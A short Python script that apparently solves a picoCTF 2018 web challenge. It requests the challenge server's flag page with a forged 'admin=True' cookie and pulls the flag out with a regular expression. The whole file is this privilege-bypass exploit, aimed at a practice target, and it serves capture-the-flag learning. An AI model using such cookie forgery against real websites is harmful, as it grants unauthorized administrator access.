import re
import requests

url = "http://2018shell.picoctf.com:33889/flag"
r = requests.get(url,cookies={'admin':'True'}) 
print re.findall('picoCTF{.*}',r.text)[0]